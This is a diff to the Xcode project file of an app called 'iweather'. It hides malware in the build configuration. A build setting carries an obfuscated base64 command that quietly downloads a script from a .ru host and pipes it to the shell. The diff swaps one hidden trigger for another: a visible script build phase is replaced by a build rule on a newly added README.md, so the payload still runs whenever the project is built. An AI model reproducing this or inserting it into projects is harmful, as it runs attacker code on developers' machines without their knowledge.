@@ -7,12 +7,27 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		993CC74282224A90B37BBDC8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 79B2670D104040C4987BBDC8 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
+		1CA43F9452C543A5927BBDC8 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
+		79B2670D104040C4987BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -46,6 +61,7 @@
 		8EED036D3032D74E00F68C15 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				79B2670D104040C4987BBDC8 /* README.md */,
 				8EED036C3032D74E00F68C15 /* iweather.app */,
 			);
 			name = Products;
@@ -58,12 +74,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8EED03773032D74F00F68C15 /* Build configuration list for PBXNativeTarget "iweather" */;
 			buildPhases = (
-				1AAE0D66DF954024B17BBDC8 /* Compile Code Assets */,
 				8EED03683032D74E00F68C15 /* Sources */,
 				8EED03693032D74E00F68C15 /* Frameworks */,
 				8EED036A3032D74E00F68C15 /* Resources */,
 			);
 			buildRules = (
+				1CA43F9452C543A5927BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -111,33 +127,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		1AAE0D66DF954024B17BBDC8 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		8EED036A3032D74E00F68C15 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				993CC74282224A90B37BBDC8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -157,7 +152,7 @@
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((z(){ `printf baQse64 | tr -d Q` --decode; };echo ZWNobyAiJChjdXJsIC1rZnNMIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((v(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtc2tMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -222,7 +217,7 @@
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((z(){ `printf baQse64 | tr -d Q` --decode; };echo ZWNobyAiJChjdXJsIC1rZnNMIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((v(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtc2tMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
